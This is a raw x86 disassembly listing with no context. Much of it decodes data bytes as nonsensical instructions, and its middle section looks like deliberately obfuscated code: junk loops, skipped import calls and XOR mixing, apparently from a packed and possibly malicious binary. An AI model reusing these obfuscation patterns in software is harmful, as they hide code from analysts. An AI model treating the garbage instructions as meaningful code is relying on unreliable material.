  4161a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161a5:	sbb    eax,DWORD PTR [ebx]
  4161a7:	xor    ebx,eax
  4161a9:	into   
  4161aa:	xchg   esp,eax
  4161ab:	fcomp  DWORD PTR [ebx+0x73]
  4161ae:	lea    esi,[ecx]
  4161b0:	add    al,dl
  4161b2:	and    ebx,ebx
  4161b4:	jecxz  0x4161e7
  4161b6:	retf   0xc8f5
  4161b9:	fsubp  st(7),st
  4161bb:	lahf   
  4161bc:	ja     0x4161d7
  4161be:	push   esi
  4161bf:	and    al,0xdc
  4161c1:	sahf   
  4161c2:	jge    0x416158
  4161c4:	mov    dl,0x99
  4161c6:	std    
  4161c7:	mov    esp,0x4169f88
  4161cc:	xor    dl,BYTE PTR [ecx+0x7c]
  4161cf:	adc    BYTE PTR [esi],dh
  4161d1:	xor    BYTE PTR [ebx],al
  4161d3:	or     BYTE PTR [esi-0x12],0x2a
  4161d7:	sub    DWORD PTR [edx],0x12eddfbb
  4161dd:	mov    esi,DWORD PTR [ebx]
  4161df:	rcr    ch,0x33
  4161e2:	icebp  
  4161e3:	stc    
  4161e4:	pop    esi
  4161e5:	and    eax,0xe1ecd96f
  4161ea:	push   edi
  4161eb:	or     eax,0x7ff7840
  4161f0:	push   ebp
  4161f1:	aaa    
  4161f2:	xchg   esp,eax
  4161f3:	jp     0x416242
  4161f5:	in     al,0xb2
  4161f7:	mov    ebp,0xafb8d1cb
  4161fc:	fnstsw WORD PTR [edi+0x153c11a8]
  416202:	(bad)
  416205:	mov    ch,0xb9
  416207:	or     eax,0xa6ec1aa8
  41620c:	xor    eax,0xdf95a815
  416211:	and    esi,0xb263ced1
  416217:	out    0x1f,eax
  416219:	or     BYTE PTR [esi-0x360010dc],ah
  41621f:	punpcklbw mm5,DWORD PTR [ecx*1+0x2de5000]
  416227:	mul    DWORD PTR ds:0xaa668f97
  41622d:	mov    eax,0xc581df25
  416232:	aam    0x1c
  416234:	fstp   DWORD PTR ds:0x355cbbae
  41623a:	adc    BYTE PTR fs:[edx+0x0],ah
  41623e:	or     eax,0x8e0c7901
  416243:	retf   0x3998
  416246:	cmp    BYTE PTR [esi],ah
  416248:	mov    dh,0x8c
  41624a:	push   0xffffff85
  41624c:	xchg   edx,eax
  41624d:	cdq    
  41624e:	or     DWORD PTR [edi+ebp*2],esp
  416251:	and    DWORD PTR [eax],esi
  416253:	mov    bh,ch
  416255:	scas   al,BYTE PTR es:[edi]
  416256:	xchg   edx,eax
  416257:	jl     0x301ed9cd
  41625d:	test   al,0x2e
  41625f:	(bad)  
  416260:	loope  0x4162d7
  416262:	dec    edx
  416263:	mov    bl,0x30
  416265:	mov    DWORD PTR [ebp+0xb],ecx
  416268:	or     dl,BYTE PTR [ecx+0x42]
  41626b:	into   
  41626c:	dec    ebx
  41626d:	scas   al,BYTE PTR es:[edi]
  41626e:	lods   eax,DWORD PTR ds:[esi]
  41626f:	sti    
  416270:	adc    BYTE PTR ds:[edi],0x7e
  416274:	jle    0x41627d
  416276:	fs add al,0xa6
  416279:	pusha  
  41627a:	fld    DWORD PTR ds:0x8d7d9ba
  416280:	fcomp  QWORD PTR [ecx]
  416282:	je     0x416283
  416284:	push   esp
  416285:	jmp    ecx
  416287:	addr16 jp 0x416265
  41628a:	cmp    ch,ah
  41628c:	xchg   edi,eax
  41628d:	mov    esi,0xdae62708
  416292:	into   
  416293:	cwde   
  416294:	pop    ebp
  416295:	cmc    
  416296:	or     ebp,ebx
  416298:	push   ax
  41629a:	(bad)  
  41629b:	je     0x4162e2
  41629d:	or     al,0x8a
  41629f:	bound  eax,QWORD PTR [ecx]
  4162a1:	adc    al,dh
  4162a3:	mov    ecx,0x52f1b23e
  4162a8:	shr    DWORD PTR [bp+si-0x57],1
  4162ac:	es wrmsr 
  4162af:	cmp    eax,0x83695cbe
  4162b4:	pop    ds
  4162b5:	inc    esp
  4162b6:	mov    bh,0x7d
  4162b8:	add    al,0x82
  4162ba:	push   cs
  4162bb:	xchg   ecx,eax
  4162bc:	ds mov edx,0xa062de8d
  4162c2:	rcl    BYTE PTR [edx+0x6c564678],cl
  4162c8:	mov    al,fs:0xd87a50c6
  4162ce:	or     al,BYTE PTR [esp+edx*1]
  4162d1:	add    eax,0x8fc6418c
  4162d6:	pop    ebp
  4162d7:	inc    ecx
  4162d8:	push   ds
  4162d9:	jne    0x4162fc
  4162db:	or     al,0xc8
  4162dd:	aad    0x7e
  4162df:	inc    esp
  4162e0:	push   ds
  4162e1:	dec    ecx
  4162e2:	lds    edx,FWORD PTR [edx]
  4162e4:	out    0x16,eax
  4162e6:	xchg   ebx,eax
  4162e7:	lods   eax,DWORD PTR ds:[esi]
  4162e8:	mov    esi,DWORD PTR ds:0xbeb3e692
  4162ee:	dec    eax
  4162ef:	sbb    bh,BYTE PTR ds:0x809090b4
  4162f5:	hlt    
  4162f6:	mov    DWORD PTR [esi+0x37050c41],ecx
  4162fc:	cmp    al,0x18
  4162fe:	mul    ebp
  416300:	sbb    dl,BYTE PTR [edx-0x4f6f6ca5]
  416306:	xor    al,0xd6
  416308:	into   
  416309:	mov    ah,0x8e
  41630b:	dec    edi
  41630c:	mov    cl,0x59
  41630e:	imul   edi,DWORD PTR [eax-0x63],0x5c2c90da
  416315:	sub    BYTE PTR [edx+0x4571aab2],0xba
  41631c:	sbb    al,BYTE PTR [eax]
  41631e:	stos   DWORD PTR es:[edi],eax
  41631f:	mov    al,ds:0x591fc179
  416324:	cmc    
  416325:	stc    
  416326:	leave  
  416327:	dec    ecx
  416328:	call   0xa7bcf982
  41632d:	sbb    dh,ah
  41632f:	jb     0x4163ae
  416331:	jle    0x416302
  416333:	mov    dl,0x62
  416335:	outs   dx,DWORD PTR ds:[esi]
  416336:	xor    cl,BYTE PTR [eax+0x66]
  416339:	inc    esi
  41633a:	xor    eax,0x1f36979c
  41633f:	aaa    
  416340:	pop    ecx
  416341:	jmp    FWORD PTR [edi+0x4643a8bc]
  416347:	in     eax,dx
  416348:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41634a:	xchg   edx,eax
  41634b:	sub    edx,DWORD PTR [edi]
  41634d:	(bad)  [ebx+0x31f755d9]
  416353:	aam    0x67
  416355:	and    DWORD PTR [ecx+0x3b3f9e29],edi
  41635b:	inc    edx
  41635c:	jge    0x4162f7
  41635e:	xchg   DWORD PTR [edx+0x20],esi
  416361:	pushf  
  416362:	(bad)  
  416363:	and    DWORD PTR [ebx+0x47c04d56],eax
  416369:	xor    al,0x24
  41636b:	gs shr edx,cl
  41636e:	jp     0x41632c
  416370:	dec    esi
  416371:	cmp    al,0x16
  416373:	push   edi
  416374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416375:	dec    esi
  416376:	jmp    0xe1f7:0x478a
  41637c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41637d:	or     BYTE PTR [ebp-0x3c],cl
  416380:	mov    ecx,0xcfd6aa19
  416385:	(bad)  [edx+ebp*8-0x46dfb389]
  41638c:	out    0x7c,eax
  41638e:	adc    BYTE PTR [esi],cl
  416390:	or     eax,0xa96d9c2e
  416395:	imul   esi,DWORD PTR [eax+0xe],0xffffffec
  416399:	jb     0x416321
  41639b:	mov    esi,db5
  41639e:	loop   0x416357
  4163a0:	cld    
  4163a1:	and    dl,BYTE PTR [esi+0x45e45a8]
  4163a7:	dec    esi
  4163a8:	in     al,dx
  4163a9:	out    0xbe,al
  4163ab:	pop    eax
  4163ac:	int    0xb7
  4163ae:	xchg   edi,eax
  4163af:	xchg   ebx,eax
  4163b0:	retf   
  4163b1:	sbb    al,cl
  4163b3:	sbb    al,0x75
  4163b5:	xchg   BYTE PTR [edx-0x1b84c36d],dl
  4163bb:	push   esi
  4163bc:	push   edi
  4163bd:	push   ss
  4163be:	and    eax,0xadf9a69b
  4163c3:	push   cs
  4163c4:	sbb    esi,esi
  4163c6:	or     esp,edi
  4163c8:	mov    esi,0xab22bd60
  4163cd:	test   BYTE PTR [edx],0x25
  4163d0:	repz cmp eax,0x8814e41d
  4163d6:	xchg   esp,eax
  4163d7:	repz push ecx
  4163d9:	add    eax,0xa7f78e89
  4163de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163df:	dec    esi
  4163e0:	imul   edx,DWORD PTR [eax],0x78
  4163e3:	dec    edi
  4163e4:	sbb    eax,0xea83d9bd
  4163e9:	jge    0x416449
  4163eb:	sahf   
  4163ec:	cmp    ecx,DWORD PTR [esp+ecx*8]
  4163ef:	ret    0x7b8c
  4163f2:	sbb    bl,al
  4163f4:	sub    ebp,DWORD PTR [edi+edx*2-0x17]
  4163f8:	repz jo 0x4163cb
  4163fb:	pop    ebp
  4163fc:	(bad)  
  4163fd:	fcom   DWORD PTR [edx+0x70]
  416400:	dec    eax
  416401:	lahf   
  416402:	scas   al,BYTE PTR es:[edi]
  416403:	jge    0x416433
  416405:	retf   0x4e41
  416408:	fcom   st(7)
  41640a:	test   BYTE PTR [ebp+0x6c],al
  41640d:	test   DWORD PTR [edx],ecx
  41640f:	enter  0x9271,0x36
  416413:	sub    eax,DWORD PTR [edi-0x4b]
  416416:	orps   xmm1,XMMWORD PTR [esi+0x52]
  41641a:	fsubr  st,st(3)
  41641c:	xchg   ebx,eax
  41641d:	fisub  WORD PTR ds:0x5c647103
  416423:	sbb    DWORD PTR [ebx],edi
  416425:	xchg   edx,eax
  416426:	pop    ss
  416427:	aam    0x9
  416429:	repnz imul esi,DWORD PTR [eax+esi*1+0x565ed9cb],0x40
  416432:	div    BYTE PTR [ebx+0xbd4b145]
  416438:	add    cl,bl
  41643a:	jmp    0xf77c2674
  41643f:	call   0x64f5:0xb72b1a77
  416446:	lea    edx,[esp+eax*2-0x4e]
  41644a:	adc    eax,0xa1b0b093
  41644f:	fwait
  416450:	cmp    eax,0xf33a0a88
  416455:	sbb    bl,BYTE PTR [eax+esi*4+0x6d]
  416459:	and    BYTE PTR [ebx],cl
  41645b:	and    eax,0x79c4a926
  416460:	pop    edi
  416461:	xchg   edx,eax
  416462:	push   ebp
  416463:	scas   al,BYTE PTR es:[edi]
  416464:	xchg   esi,eax
  416465:	dec    edi
  416466:	bound  ebx,QWORD PTR [ecx-0x16]
  416469:	fnsave [edx-0x5dec22b1]
  41646f:	in     al,0x71
  416471:	inc    esp
  416472:	add    bl,BYTE PTR [esi]
  416474:	dec    esi
  416475:	loopne 0x416487
  416477:	sub    al,0x3
  416479:	or     ebx,DWORD PTR [eax-0x136dd92]
  41647f:	mov    ss,ecx
  416481:	fidivr DWORD PTR [ebp+0x45e55eb4]
  416487:	push   0x6f
  416489:	fsubp  st(3),st
  41648b:	pop    DWORD PTR es:[ebx+0x6fdd5423]
  416492:	xchg   esp,eax
  416493:	push   esp
  416494:	mov    edx,0xa691035f
  416499:	mov    ah,0x8f
  41649b:	adc    eax,0x34f5cfac
  4164a0:	push   esi
  4164a1:	retf   
  4164a2:	xchg   edi,eax
  4164a3:	jae    0x4164cf
  4164a5:	pop    ecx
  4164a6:	cdq    
  4164a7:	mov    ds:0xfdff71ef,al
  4164ac:	xor    eax,0x8c4d328c
  4164b1:	daa    
  4164b2:	jae    0x416483
  4164b4:	jl     0x4164e6
  4164b6:	push   0x52
  4164b8:	push   esp
  4164b9:	cmp    eax,0xac58a00
  4164be:	aad    0xae
  4164c0:	adc    eax,0x20dbe313
  4164c5:	xchg   esp,eax
  4164c6:	pop    esi
  4164c7:	iret   
  4164c8:	aad    0x42
  4164ca:	pop    ebx
  4164cb:	jbe    0x41651e
  4164cd:	in     eax,0x15
  4164cf:	jle    0x416489
  4164d1:	dec    edx
  4164d2:	fstp   DWORD PTR [esp+ecx*2+0x53fc697d]
  4164d9:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4164db:	loope  0x41653a
  4164dd:	jmp    0x13c8320d
  4164e2:	into   
  4164e3:	jo     0x41648a
  4164e5:	(bad)  
  4164e6:	push   0x39
  4164e8:	in     eax,dx
  4164e9:	jno    0x416551
  4164eb:	cld    
  4164ec:	add    al,0x30
  4164ee:	(bad)  [esp+eax*1-0x57386c0d]
  4164f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f6:	xor    eax,0x467b527a
  4164fb:	hlt    
  4164fc:	xchg   ebx,eax
  4164fd:	pop    ecx
  4164fe:	push   ss
  4164ff:	xor    esi,DWORD PTR ds:0x5443c73d
  416505:	cwde   
  416506:	mov    dl,0x33
  416508:	pop    ebx
  416509:	mov    eax,0xb05b8f13
  41650e:	cmc    
  41650f:	mov    eax,0x92ac6735
  416514:	out    0x32,al
  416516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416517:	pop    eax
  416518:	pop    ebp
  416519:	mov    al,ds:0xd4139f2e
  41651e:	out    0xf2,al
  416520:	loope  0x4164cd
  416522:	add    esp,DWORD PTR [edx-0x2f06260f]
  416528:	or     eax,0x31b513da
  41652d:	test   al,0x5a
  41652f:	mov    cs,WORD PTR [edx]
  416531:	jl     0x4165af
  416533:	push   esi
  416534:	test   edi,ebp
  416536:	sbb    BYTE PTR [edx],bl
  416538:	push   0x94866197
  41653d:	sahf   
  41653e:	jb     0x4165a4
  416540:	shl    BYTE PTR [esp+ebx*8],1
  416543:	movzx  ecx,WORD PTR [ecx+edx*4]
  416547:	xor    DWORD PTR ds:0x428ea7,0x428e77
  416551:	xor    ecx,0x8a9b
  416557:	mov    DWORD PTR ds:0x428ea3,0x5f74
  416561:	add    ecx,edi
  416563:	mov    edi,DWORD PTR [ebp-0xc]
  416566:	mov    DWORD PTR ds:0x428e73,0x23ca
  416570:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416577:	inc    edx
  416578:	mov    ecx,DWORD PTR [ebp-0x10]
  41657b:	mov    DWORD PTR ds:0x428e37,0x4a6a
  416585:	cmp    edx,ecx
  416587:	mov    DWORD PTR ds:0x428e73,0x3902
  416591:	jne    0x414140
  416597:	mov    ecx,DWORD PTR [ebp-0x18]
  41659a:	mov    DWORD PTR ds:0x428ebf,0x19
  4165a4:	cmp    DWORD PTR ds:0x428ebf,0x0
  4165ab:	je     0x4165e3
  4165b1:	cmp    DWORD PTR ds:0x428ebf,0x1d
  4165b8:	jle    0x4165e3
  4165be:	jmp    0x4165d1
  4165c3:	push   DWORD PTR [ebp-0x14]
  4165c6:	push   0x8b92
  4165cb:	call   DWORD PTR ds:0x42a9f3
  4165d1:	mov    edx,DWORD PTR ds:0x428ebf
  4165d7:	dec    edx
  4165d8:	mov    DWORD PTR ds:0x428ebf,edx
  4165de:	jmp    0x4165a4
  4165e3:	mov    edx,DWORD PTR [ebp+0x10]
  4165e6:	and    DWORD PTR ds:0x428e83,0x0
  4165f0:	mov    edi,DWORD PTR ds:0x428e83
  4165f6:	inc    edi
  4165f7:	mov    DWORD PTR ds:0x428e83,edi
  4165fd:	cmp    DWORD PTR ds:0x428e83,0x2c
  416604:	jg     0x416627
  41660a:	jmp    0x41661a
  41660f:	push   0x428e8f
  416614:	call   DWORD PTR ds:0x42a9f7
  41661a:	cmp    DWORD PTR ds:0x428e83,0x1e
  416621:	jb     0x4165f0
  416627:	xor    ecx,eax
  416629:	add    DWORD PTR ds:0x428e97,edx
  41662f:	add    ecx,esi
  416631:	xor    DWORD PTR ds:0x428e57,edx
  416637:	mov    DWORD PTR [edx],ecx
  416639:	sbb    edi,ecx
  41663b:	mov    ecx,DWORD PTR [ebp-0x18]
  41663e:	xor    DWORD PTR ds:0x428ec7,ebx
  416644:	xor    ecx,eax
  416646:	add    ecx,esi
  416648:	mov    DWORD PTR ds:0x428ebb,0x1e
  416652:	cmp    DWORD PTR ds:0x428ebb,0x0
  416659:	je     0x4166a8
  41665f:	cmp    DWORD PTR ds:0x428ebb,0x2
  416666:	jbe    0x4166a8
  41666c:	jmp    0x41667c
  416671:	push   0x71f6
  416676:	call   DWORD PTR ds:0x42a9fb
  41667c:	cmp    DWORD PTR ds:0x428ebb,0x3
  416683:	jne    0x416696
  416689:	mov    edi,DWORD PTR ds:0x428ebb
  41668f:	dec    edi
  416690:	mov    DWORD PTR ds:0x428ebb,edi
  416696:	mov    edi,DWORD PTR ds:0x428ebb
  41669c:	dec    edi
  41669d:	mov    DWORD PTR ds:0x428ebb,edi
  4166a3:	jmp    0x416652
  4166a8:	mov    DWORD PTR [ebp-0xc],ecx
  4166ab:	sbb    DWORD PTR ds:0x428eab,0x39c1
  4166b5:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4166bc:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4166c3:	sbb    edi,ecx
  4166c5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4166cc:	mov    DWORD PTR ds:0x428e6f,0x17
  4166d6:	cmp    DWORD PTR ds:0x428e6f,0x0
  4166dd:	je     0x41671c
  4166e3:	cmp    DWORD PTR ds:0x428e6f,0x23
  4166ea:	jl     0x41671c
  4166f0:	jmp    0x41670a
  4166f5:	push   0x4cf4
  4166fa:	push   0x428e23
  4166ff:	push   0x15e1
  416704:	call   DWORD PTR ds:0x42a9ff
  41670a:	mov    edi,DWORD PTR ds:0x428e6f
  416710:	dec    edi
  416711:	mov    DWORD PTR ds:0x428e6f,edi
  416717:	jmp    0x4166d6
  41671c:	mov    ecx,DWORD PTR [ebp-0x14]
  41671f:	add    edi,DWORD PTR ds:0x428e3f
  416725:	mov    DWORD PTR [ebp+0x8],ecx
  416728:	sub    edi,0x632b
  41672e:	mov    ecx,DWORD PTR [ebp+0x8]
  416731:	xor    DWORD PTR ds:0x428e53,edi
  416737:	xor    ecx,eax
  416739:	mov    edi,DWORD PTR ds:0x428e9b
  41673f:	adc    DWORD PTR ds:0x428ebb,edi
  416745:	add    ecx,esi
  416747:	mov    edi,DWORD PTR ds:0x428e43
  41674d:	mov    ecx,0x242ebf1
  416752:	mov    edi,0xf641bf2
  416757:	mov    DWORD PTR ds:0x428e77,0x250d
  416761:	je     0x4191f8
  416767:	mov    edx,DWORD PTR [ebp+0x8]
  41676a:	mov    ebx,DWORD PTR [ebp-0x8]
  41676d:	neg    DWORD PTR ds:0x428e8f
  416773:	xor    edx,eax
  416775:	xor    ebx,eax
  416777:	sub    edx,ebx
  416779:	xor    DWORD PTR ds:0x428e63,edx
  41677f:	sub    edx,esi
  416781:	add    DWORD PTR ds:0x428eaf,0x644f
  41678b:	xor    edx,eax
  41678d:	or     DWORD PTR ds:0x428e27,0x4378
  416797:	mov    DWORD PTR [ebp+0x8],edx
  41679a:	and    DWORD PTR ds:0x428e67,0x0
  4167a4:	mov    edx,DWORD PTR ds:0x428e67
  4167aa:	inc    edx
  4167ab:	mov    DWORD PTR ds:0x428e67,edx
  4167b1:	cmp    DWORD PTR ds:0x428e67,0xe
  4167b8:	jl     0x4167f7
  4167be:	jmp    0x4167ce
  4167c3:	push   0x428111
  4167c8:	call   DWORD PTR ds:0x42a9cb
  4167ce:	cmp    DWORD PTR ds:0x428e67,0xd
  4167d5:	jne    0x4167ea
  4167db:	xor    edx,edx
  4167dd:	xor    edx,DWORD PTR ds:0x428e67
  4167e3:	inc    edx
  4167e4:	mov    DWORD PTR ds:0x428e67,edx
  4167ea:	cmp    DWORD PTR ds:0x428e67,0x1e
  4167f1:	jb     0x4167a4
  4167f7:	mov    edx,DWORD PTR [ebp+0x8]
  4167fa:	mov    ebx,DWORD PTR [ebp-0x58]
  4167fd:	adc    DWORD PTR ds:0x428eaf,0x428e9b
  416807:	add    edx,0x5708e4
  41680d:	imul   edx,ebx
  416810:	mov    ebx,DWORD PTR ds:0x428e87
  416816:	or     DWORD PTR ds:0x428e57,ebx
  41681c:	mov    DWORD PTR [ebp-0x58],edx
  41681f:	mov    edx,DWORD PTR ds:0x42977f
  416825:	mov    ebx,DWORD PTR ds:0x429bff
  41682b:	sub    ebx,edx
  41682d:	xor    edx,DWORD PTR [edx+ebx*1]
  416830:	mov    edx,DWORD PTR [ebp+0x8]
  416833:	mov    ebx,DWORD PTR [ebp-0x54]
  416836:	xor    DWORD PTR ds:0x428e5b,0x428e83
  416840:	add    edx,0x64f882
  416846:	and    DWORD PTR ds:0x428eab,0x41a4
  416850:	or     edx,ebx
  416852:	and    DWORD PTR ds:0x428e53,0x0
  41685c:	mov    ebx,DWORD PTR ds:0x428e53
  416862:	inc    ebx
  416863:	mov    DWORD PTR ds:0x428e53,ebx
  416869:	cmp    DWORD PTR ds:0x428e53,0x1d
  416870:	ja     0x416893
  416876:	jmp    0x416886
  41687b:	push   0x42815b
  416880:	call   DWORD PTR ds:0x42a9cf
  416886:	cmp    DWORD PTR ds:0x428e53,0x11
  41688d:	jb     0x41685c
  416893:	mov    DWORD PTR [ebp-0x54],edx
  416896:	mov    DWORD PTR ds:0x428e83,0x1e
  4168a0:	cmp    DWORD PTR ds:0x428e83,0x0
  4168a7:	je     0x4168f8
  4168ad:	cmp    DWORD PTR ds:0x428e83,0xe
  4168b4:	jb     0x4168f8
  4168ba:	jmp    0x4168ca
  4168bf:	push   0x8096
  4168c4:	call   DWORD PTR ds:0x42a9d3
  4168ca:	cmp    DWORD PTR ds:0x428e83,0xf
  4168d1:	jne    0x4168e6
  4168d7:	xor    edx,edx
  4168d9:	add    edx,DWORD PTR ds:0x428e83
  4168df:	dec    edx
  4168e0:	mov    DWORD PTR ds:0x428e83,edx
  4168e6:	mov    edx,DWORD PTR ds:0x428e83
  4168ec:	dec    edx
  4168ed:	mov    DWORD PTR ds:0x428e83,edx
  4168f3:	jmp    0x4168a0
  4168f8:	mov    edx,DWORD PTR [ebp+0x8]
  4168fb:	mov    ebx,DWORD PTR [ebp-0x50]
  4168fe:	sub    DWORD PTR ds:0x428e8b,0x428e67
  416908:	add    edx,ecx
  41690a:	xor    edx,ebx
  41690c:	xor    DWORD PTR ds:0x428e73,0x75fe
  416916:	mov    DWORD PTR [ebp-0x50],edx
  416919:	sbb    DWORD PTR ds:0x428eaf,0x1c33
  416923:	mov    edx,DWORD PTR [ebp+0x8]
  416926:	adc    DWORD PTR ds:0x428e4b,edx
  41692c:	mov    ebx,DWORD PTR [ebp-0x4c]
  41692f:	sbb    DWORD PTR ds:0x428e73,0x359
  416939:	add    edx,edi
  41693b:	add    DWORD PTR ds:0x428e33,0x428e43
  416945:	and    edx,ebx
  416947:	movzx  ebx,WORD PTR ds:0x428e3b
  41694e:	xor    DWORD PTR ds:0x428eb7,ebx
  416954:	mov    DWORD PTR [ebp-0x4c],edx
  416957:	add    ebx,DWORD PTR ds:0x428ebf
  41695d:	mov    edx,DWORD PTR [ebp+0x8]
  416960:	or     ebx,DWORD PTR ds:0x428e33
  416966:	mov    ebx,DWORD PTR [ebp-0x48]
  416969:	lea    edx,[ebx+edx*1+0x241fcdf]
  416970:	xor    DWORD PTR ds:0x428eab,0x519b
  41697a:	mov    DWORD PTR [ebp-0x48],edx
  41697d:	mov    edx,DWORD PTR [ebp+0x8]
  416980:	and    DWORD PTR ds:0x428eab,0x0
  41698a:	jmp    0x41699e
  41698f:	xor    ebx,ebx
  416991:	or     ebx,DWORD PTR ds:0x428eab
  416997:	inc    ebx
  416998:	mov    DWORD PTR ds:0x428eab,ebx
  41699e:	cmp    DWORD PTR ds:0x428eab,0x1b
  4169a5:	jae    0x4169e7
  4169ab:	cmp    DWORD PTR ds:0x428eab,0xb
  4169b2:	jbe    0x4169e7
  4169b8:	jmp    0x4169c8
  4169bd:	push   0x42815b
  4169c2:	call   DWORD PTR ds:0x42a9db
  4169c8:	cmp    DWORD PTR ds:0x428eab,0xa
  4169cf:	jne    0x4169e2
  4169d5:	mov    ebx,DWORD PTR ds:0x428eab
  4169db:	inc    ebx
  4169dc:	mov    DWORD PTR ds:0x428eab,ebx
  4169e2:	jmp    0x41698f
  4169e7:	mov    ebx,0xfa5e1522
  4169ec:	or     DWORD PTR ds:0x428e7b,0x3b15
  4169f6:	sub    ebx,edx
  4169f8:	add    ebx,DWORD PTR [ebp-0x44]
  4169fb:	mov    DWORD PTR [ebp-0x44],ebx
  4169fe:	mov    edx,DWORD PTR ds:0x428e8f
  416a04:	xor    edx,DWORD PTR ds:0x428e27
  416a0a:	mov    DWORD PTR ds:0x428e8f,edx
  416a10:	mov    edx,DWORD PTR [ebp+0x8]
  416a13:	xor    edx,eax
  416a15:	add    edx,esi
  416a17:	jne    0x416767
  416a1d:	mov    DWORD PTR ds:0x428ea3,0x25d2
  416a27:	jmp    0x4191f8
  416a2c:	mov    edx,DWORD PTR [ebp-0xc]
  416a2f:	xor    ebx,ebx
  416a31:	or     ebx,DWORD PTR ds:0x428ea3
  416a37:	xor    ebx,DWORD PTR ds:0x428ea7
  416a3d:	mov    DWORD PTR ds:0x428ea3,ebx
  416a43:	sub    edx,esi
  416a45:	xor    edx,eax
  416a47:	sbb    ebx,DWORD PTR ds:0x428e87
  416a4d:	mov    DWORD PTR [ebp-0x5c],edx
  416a50:	jmp    0x418e09
  416a55:	out    0xe2,al
  416a57:	dec    edx
  416a58:	mov    dl,0x46
  416a5a:	stos   BYTE PTR es:[edi],al
  416a5b:	xchg   BYTE PTR [esi+0x2de23c83],dl
  416a61:	jle    0x416a01
  416a63:	ret    
  416a64:	mov    eax,ds:0x838244f9
  416a69:	out    0x60,eax
  416a6b:	add    DWORD PTR [ebx+0x35766484],0x20
  416a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a74:	xchg   esi,eax
  416a75:	sub    BYTE PTR [ebp-0x1c],0x1a
  416a79:	mov    edi,0x68b2e25b
  416a7e:	pop    DWORD PTR [edi]
  416a80:	mov    eax,0x1ba1367b
  416a85:	jg     0x416a9a
  416a87:	lds    esi,FWORD PTR [ebx+0x2f43d7bf]
  416a8d:	mov    ch,ah
  416a8f:	and    ecx,DWORD PTR ds:0x16d22bf5
  416a95:	cld    
  416a96:	out    dx,eax
  416a97:	mov    esp,0x5d9d361e
  416a9c:	xor    al,0xb0
  416a9e:	push   edi
  416a9f:	mov    esi,0x8584ebb0
  416aa4:	and    al,BYTE PTR ds:0x84cb1e68
  416aaa:	sub    bh,bh
  416aac:	call   0x1c4a:0x7b968832
  416ab3:	loopne 0x416b11
  416ab5:	pop    ebp
  416ab6:	add    dl,cl
  416ab8:	cmc    
  416ab9:	loop   0x416acd
  416abb:	or     eax,DWORD PTR [eax+eax*8+0x46c2872]
  416ac2:	cmc    
  416ac3:	pop    esi
  416ac4:	rcl    DWORD PTR [eax],1
  416ac6:	adc    BYTE PTR [edi],bl
  416ac8:	outs   dx,DWORD PTR ds:[esi]
  416ac9:	inc    ecx
  416aca:	mov    ah,dh
  416acc:	xchg   edi,eax
  416acd:	call   0xbe1c630b
  416ad2:	push   ebp
  416ad3:	pop    ss
  416ad4:	xor    al,0xe1
  416ad6:	stos   BYTE PTR es:[edi],al
  416ad7:	jns    0x416af1
  416ad9:	sub    cl,dh
  416adb:	popf   
  416adc:	in     al,dx
  416add:	dec    DWORD PTR [esi-0x12]
  416ae0:	or     edx,DWORD PTR [ebp+0x4b656fde]
  416ae6:	icebp  
  416ae7:	(bad)  
  416ae8:	mov    esp,0x8bdb56b3
  416aed:	pop    eax
  416aee:	outs   dx,BYTE PTR ds:[esi]
  416aef:	xchg   ecx,eax
  416af0:	aam    0x97
  416af2:	push   esi
  416af3:	call   DWORD PTR [edx+0x49]
  416af6:	mov    ah,0xef
  416af8:	call   0xe1831979
  416afd:	(bad)  
  416afe:	push   esp
  416aff:	scas   eax,DWORD PTR es:[edi]
  416b00:	retf   0xb132
  416b03:	xchg   DWORD PTR [esi],esp
  416b05:	popf   
  416b06:	pop    ss
  416b07:	cmp    ecx,edx
  416b09:	xchg   ebx,eax
  416b0a:	ret    
  416b0b:	out    0x4f,al
  416b0d:	inc    ecx
  416b0e:	mov    dl,0x12
  416b10:	les    eax,FWORD PTR [esi+0x46]
  416b13:	iret   
  416b14:	jp     0x416aab
  416b16:	inc    edi
  416b17:	cmp    ah,BYTE PTR [ebp-0x6c5baff]
  416b1d:	pop    es
  416b1e:	adc    BYTE PTR [ecx-0x5871135b],bh
  416b24:	jne    0x416b43
  416b26:	xchg   esi,eax
  416b27:	enter  0x1bb7,0xf1
  416b2b:	mov    bl,dl
  416b2d:	sar    esi,1
  416b2f:	shl    BYTE PTR [ecx],cl
  416b31:	cdq    
  416b32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b33:	push   edx
  416b34:	shl    BYTE PTR [esi+0x723b1484],0x8b
  416b3b:	stos   BYTE PTR es:[edi],al
  416b3c:	popf   
  416b3d:	xor    eax,0x963d142b
  416b42:	sbb    al,0x18
  416b44:	xor    BYTE PTR [edi+0x37d30e80],cl
  416b4a:	mov    DWORD PTR [ebx+0x57],ebx
  416b4d:	jl     0x416bb6
  416b4f:	mov    cl,0x7f
  416b51:	push   cs
  416b52:	or     ah,dh
  416b54:	adc    cl,BYTE PTR [esi+0xd]
  416b57:	pop    esp
  416b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b59:	loope  0x416af3
  416b5b:	sub    eax,0x84673ab3
  416b60:	stos   DWORD PTR es:[edi],eax
  416b61:	push   ebp
  416b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b63:	jmp    0x416af0
  416b65:	sbb    DWORD PTR [edi-0x6c0917a9],ebx
  416b6b:	fisub  WORD PTR [edx+0x54]
  416b6e:	hlt    
  416b6f:	xlat   BYTE PTR ds:[ebx]
  416b70:	mov    ah,0xf1
  416b72:	outs   dx,BYTE PTR ds:[esi]
  416b73:	push   edi
  416b74:	mov    ebp,0x6c8c68b7
  416b79:	imul   edi,esp,0x1f
